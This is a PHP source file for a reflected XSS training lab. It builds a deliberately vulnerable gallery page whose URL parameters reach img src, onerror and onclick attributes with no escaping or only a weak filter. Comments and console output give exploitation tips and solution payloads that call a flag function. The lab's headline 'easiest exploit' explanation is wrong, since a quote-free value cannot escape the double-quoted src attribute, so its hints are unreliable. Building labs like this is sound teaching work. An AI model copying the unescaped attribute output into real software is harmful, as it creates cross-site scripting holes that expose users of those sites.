<?php
/**
 * Reflected XSS Lab - Event Handler Attribute
 * Vulnerable Gallery Page
 */

session_start();

// Get flag from session
$flag = isset($_SESSION['xss_flag']) ? $_SESSION['xss_flag'] : 'IDS{session_error}';

// Get user input from various parameters
$image = isset($_GET['image']) ? $_GET['image'] : 'default.jpg';
$caption = isset($_GET['caption']) ? $_GET['caption'] : 'Gallery Image';
$alt = isset($_GET['alt']) ? $_GET['alt'] : 'Image description';
$fallback = isset($_GET['fallback']) ? $_GET['fallback'] : 'fallback.jpg';
$src = isset($_GET['src']) ? $_GET['src'] : ''; // Legacy parameter
$onclick = isset($_GET['action']) ? $_GET['action'] : ''; // User-defined action

/**
 * Escaping function for HTML attributes
 * Has vulnerabilities in event handler context
 */
function escapeForAttribute($input) {
    // This properly escapes for HTML attributes
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}

/**
 * Basic sanitization for event handlers
 * Can be bypassed with certain payloads
 */
function sanitizeEventHandler($input) {
    // Remove script tags
    $input = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $input);
    // Block javascript: protocol
    $input = str_ireplace('javascript:', '', $input);
    return $input;
}

// Apply escaping - different attributes get different treatment
$safeImage = escapeForAttribute($image);
$safeCaption = escapeForAttribute($caption);
$safeAlt = escapeForAttribute($alt);
$safeFallback = escapeForAttribute($fallback);
$safeSrc = $src; // Legacy - NO escaping! (vulnerability)
$safeOnclick = sanitizeEventHandler($onclick); // Weak sanitization

// For the title attribute - different quote style
$titleAttr = isset($_GET['tooltip']) ? $_GET['tooltip'] : 'View image';
$safeTitle = escapeForAttribute($titleAttr);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Gallery | PixelPerfect</title>
    <link rel="stylesheet" href="style.css">
    <script>
        // Flag storage - only accessible through successful XSS
        const GALLERY_FLAG = "<?php echo $flag; ?>";

        // ============================================================================
        // VULNERABLE CODE: User input in event handler attributes
        // ============================================================================
        // The following HTML elements have user input reflected into event handlers
        // with varying levels of sanitization that can be bypassed
        // ============================================================================

        // Validate XSS and show flag
        function validateExploit() {
            alert('Congratulations! XSS Flag: ' + GALLERY_FLAG);
            return GALLERY_FLAG;
        }

        // Image error handler (can be overridden by user input)
        function handleImageError(img) {
            console.log('Image failed to load:', img.src);
            // Default error handling
        }

        // Default action handler
        function defaultAction() {
            alert('Image clicked!');
        }

        console.log('%cGallery system initialized', 'color: green; font-weight: bold;');
        console.log('Flag stored in GALLERY_FLAG variable');
        console.log('Call validateExploit() to retrieve the flag');
    </script>
</head>
<body>
    <div class="container">
        <header>
            <h1>🖼️ Image Gallery</h1>
            <p class="tagline">Dynamic image showcase with custom attributes</p>
        </header>

        <nav>
            <a href="index.php">Home</a>
            <a href="gallery.php" class="active">Gallery</a>
            <a href="upload.php">Upload</a>
            <a href="#" onclick="showHelp(); return false;">Help</a>
        </nav>

        <main>
            <section class="gallery-controls">
                <h3>Customize Gallery View</h3>
                <p>Use URL parameters to customize the image display:</p>

                <div class="params-grid">
                    <div class="param-card">
                        <code>?image=filename.jpg</code>
                        <span>Set image source</span>
                    </div>
                    <div class="param-card">
                        <code>?caption=YourText</code>
                        <span>Set image caption</span>
                    </div>
                    <div class="param-card">
                        <code>?alt=Description</code>
                        <span>Set alt text</span>
                    </div>
                    <div class="param-card">
                        <code>?fallback=file.jpg</code>
                        <span>Fallback on error</span>
                    </div>
                    <div class="param-card">
                        <code>?src=filename.jpg</code>
                        <span>Legacy image source</span>
                    </div>
                    <div class="param-card">
                        <code>?action=code</code>
                        <span>Custom click action</span>
                    </div>
                    <div class="param-card">
                        <code>?tooltip=Text</code>
                        <span>Tooltip text</span>
                    </div>
                </div>

                <div class="example-box">
                    <p><strong>Quick Examples:</strong></p>
                    <a href="gallery.php?image=sunset.jpg&caption=Beautiful Sunset" class="example-link">Sunset Image</a>
                    <a href="gallery.php?src=invalid.jpg&fallback=default.jpg" class="example-link">Test Error Handler</a>
                    <a href="gallery.php?alt=Custom%20Alt&tooltip=Hover%20me" class="example-link">Custom Alt & Tooltip</a>
                </div>
            </section>

            <!-- ============================================================================
                 VULNERABLE CODE 1: Image with onerror attribute containing user input
                 ============================================================================ -->
            <section class="gallery-display">
                <h2>Featured Image</h2>
                <div class="image-container">
                    <!-- VULNERABLE: alt attribute uses htmlspecialchars (safe for HTML but context matters) -->
                    <!-- LESS VULNERABLE: onerror uses htmlspecialchars, but let's see... -->
                    <img src="<?php echo $safeImage; ?>"
                         alt="<?php echo $safeAlt; ?>"
                         onerror="this.src='<?php echo $safeFallback; ?>'; handleImageError(this);"
                         class="main-image">
                </div>
                <p class="caption"><?php echo $safeCaption; ?></p>
            </section>

            <!-- ============================================================================
                 VULNERABLE CODE 2: Legacy parameter with minimal escaping
                 ============================================================================ -->
            <section class="legacy-display">
                <h2>Legacy Image Display</h2>
                <p class="warning">⚠️ Legacy mode with minimal validation</p>
                <div class="image-container">
                    <!-- VULNERABLE: src parameter has NO escaping! -->
                    <!-- VULNERABLE: onerror with weak sanitization -->
                    <img src="<?php echo $safeSrc; ?>"
                         alt="Legacy display"
                         onerror="this.src='fallback.jpg'; <?php echo $safeOnclick; ?>"
                         class="legacy-image"
                         title="<?php echo $safeTitle; ?>">
                </div>
                <p class="note">Legacy image system - uses ?src= parameter with reduced validation</p>
            </section>

            <!-- ============================================================================
                 VULNERABLE CODE 3: Custom action in onclick
                 ============================================================================ -->
            <section class="interactive-display">
                <h2>Interactive Image</h2>
                <p>Click the image to test custom actions:</p>
                <div class="image-container">
                    <!-- VULNERABLE: onclick contains sanitized but potentially exploitable input -->
                    <img src="interactive.jpg"
                         alt="Interactive image"
                         onclick="<?php echo $safeOnclick; ?> defaultAction();"
                         class="interactive-image"
                         title="<?php echo $safeTitle; ?>">
                </div>
                <p class="note">Use ?action= to set custom click behavior</p>
            </section>

            <!-- Hidden clues -->
            <!--
            ========================================================================
            GALLERY VULNERABILITY ANALYSIS
            ========================================================================

            VULNERABILITY 1 - Standard Display (image, alt, caption parameters):
            ---------------------------------------------------------------------
            Code: <img src="..." onerror="this.src='<?php echo $safeFallback; ?>'; ...">
            Context: Event handler attribute value
            Escaping: htmlspecialchars() with ENT_QUOTES
            Quote Style: Single quote (')
            Challenge: htmlspecialchars converts ' to &#039; which may not help
                     inside an already-quoted JavaScript context

            VULNERABILITY 2 - Legacy Display (src parameter):
            ---------------------------------------------------
            Code: <img src="<?php echo $safeSrc; ?>" ...>
            Context: src attribute value
            Escaping: NONE - direct injection!
            Quote Style: Double quote (")
            Challenge: Can inject arbitrary attributes after closing src
            Payload: x onerror=alert(1)

            VULNERABILITY 3 - Interactive Display (action parameter):
            ----------------------------------------------------------
            Code: onclick="<?php echo $safeOnclick; ?> defaultAction();"
            Context: Event handler attribute value
            Escaping: sanitizeEventHandler() - removes <script> and javascript:
            Quote Style: Double quote (")
            Challenge: Can inject JS directly without script tags
            Payload: alert(1);//

            Additional Vulnerabilities:
            -----------------------------
            - title attribute: Uses htmlspecialchars but in different context
            - Multiple injection points with different sanitization levels
            - Quote style inconsistencies between attributes

            Event Handler Context Tips:
            -----------------------------
            1. Event handlers contain JavaScript code, not HTML
            2. You can call existing functions: validateExploit()
            3. Close the attribute quote: " or '
            4. After closing quote, you can add new attributes: onerror=...
            5. Or inject JS directly: alert(1);//

            Example Payloads to Try:
            -------------------------
            1. Legacy src (easiest):
               ?src=x onerror=validateExploit()
               Result: <img src="x onerror=validateExploit()" ...>

            2. Action parameter:
               ?action=validateExploit();//
               Result: onclick="validateExploit();// defaultAction();"

            3. Tooltip with attribute injection:
               ?tooltip=" onmouseover=validateExploit() x="
               Result: title="&quot; onmouseover=validateExploit() x=&quot;"
               (htmlspecialchars prevents this, but try other attributes!)

            ========================================================================
            -->

            <section class="debug-section">
                <h3>🔍 Debug Information</h3>
                <p>Current parameters:</p>
                <ul class="debug-list">
                    <li>image: <code><?php echo htmlspecialchars($image, ENT_QUOTES, 'UTF-8'); ?></code></li>
                    <li>caption: <code><?php echo htmlspecialchars($caption, ENT_QUOTES, 'UTF-8'); ?></code></li>
                    <li>alt: <code><?php echo htmlspecialchars($alt, ENT_QUOTES, 'UTF-8'); ?></code></li>
                    <li>fallback: <code><?php echo htmlspecialchars($fallback, ENT_QUOTES, 'UTF-8'); ?></code></li>
                    <li>src: <code><?php echo htmlspecialchars($src, ENT_QUOTES, 'UTF-8'); ?></code></li>
                    <li>action: <code><?php echo htmlspecialchars($onclick, ENT_QUOTES, 'UTF-8'); ?></code></li>
                </ul>
                <p class="note">
                    <strong>Tip:</strong> Open browser DevTools and inspect the generated HTML
                    to see how parameters are reflected in different contexts.
                </p>
            </section>

            <section class="tips">
                <h3>💡 Exploitation Tips</h3>
                <ul class="tips-list">
                    <li><strong>Attribute injection:</strong> Close the attribute with quote, inject new attribute</li>
                    <li><strong>Direct JS execution:</strong> Some event handlers allow direct JS code</li>
                    <li><strong>Trigger on error:</strong> Use invalid image URL to trigger onerror handler</li>
                    <li><strong>Quote styles matter:</strong> Single (') vs double (") quotes affect escaping</li>
                    <li><strong>Legacy parameters:</strong> Often have weaker validation (look for ?src=)</li>
                </ul>
            </section>
        </main>

        <footer>
            <p>&copy; 2024 PixelPerfect Gallery. All rights reserved.</p>
            <p class="version">Gallery v2.4.0 | Event Handler Context: Attribute Injection</p>
        </footer>
    </div>

    <script>
        function showHelp() {
            alert('Gallery Help:\n\nCustomize images with URL parameters:\n\n- ?image=file.jpg\n- ?caption=Text\n- ?alt=Description\n- ?fallback=file.jpg\n- ?src=file.jpg (legacy)\n- ?action=code\n- ?tooltip=Text\n\nExample:\ngallery.php?image=photo.jpg&caption=Sunset');
        }

        // Initialize and show hints
        document.addEventListener('DOMContentLoaded', function() {
            console.log('%c=== EVENT HANDLER XSS LAB ===', 'font-weight: bold; color: #ff6b6b;');
            console.log('');
            console.log('Vulnerable injection points:');
            console.log('1. Legacy ?src= parameter - minimal escaping');
            console.log('2. ?action= parameter - weak sanitization in onclick');
            console.log('3. Various attributes with different quote styles');
            console.log('');
            console.log('%cEasiest exploit:', 'color: yellow; font-weight: bold;');
            console.log('gallery.php?src=x onerror=validateExploit()');
            console.log('');
            console.log('This injects: <img src="x onerror=validateExploit()">');
            console.log('Creating: <img src="x" onerror="validateExploit()">');

            // Random event handler tip
            const tips = [
                "onerror fires when an image fails to load - use invalid URLs!",
                "To inject a new attribute: close quote, add attribute, optional value",
                "Example: \" onerror=alert(1) creates a new onerror attribute",
                "Or inject JS directly: alert(1); as the event handler value",
                "The validateExploit() function contains the flag retrieval logic"
            ];
            console.log('%c💡 ' + tips[Math.floor(Math.random() * tips.length)], 'color: #888; font-style: italic;');
        });
    </script>

    <!--
    ========================================================================
    SOLUTION HINTS (Try these payloads)
    ========================================================================

    EASIEST - Legacy src parameter with attribute injection:
    --------------------------------------------------------
    URL: gallery.php?src=x onerror=validateExploit()
    Generated HTML: <img src="x onerror=validateExploit()" ...>
    Browser parses: <img src="x" onerror="validateExploit()" ...>
    Result: New onerror attribute added!

    ALTERNATIVE - Action parameter with direct JS:
    -----------------------------------------------
    URL: gallery.php?action=validateExploit();//
    Generated HTML: onclick="validateExploit();// defaultAction();"
    Result: Direct JS execution in onclick handler

    ADVANCED - Fallback parameter injection:
    -----------------------------------------
    URL: gallery.php?image=x.jpg&fallback=' onerror=validateExploit() x='
    Generated HTML: onerror="this.src='&#039; onerror=validateExploit() x=&#039;;..."
    (htmlspecialchars prevents this - need different approach)

    CHALLENGE - Tooltip with HTML entities bypass:
    -----------------------------------------------
    Can you bypass htmlspecialchars to inject attributes?
    Hint: Some browsers handle entity decoding differently...

    ========================================================================
    -->
</body>
</html>
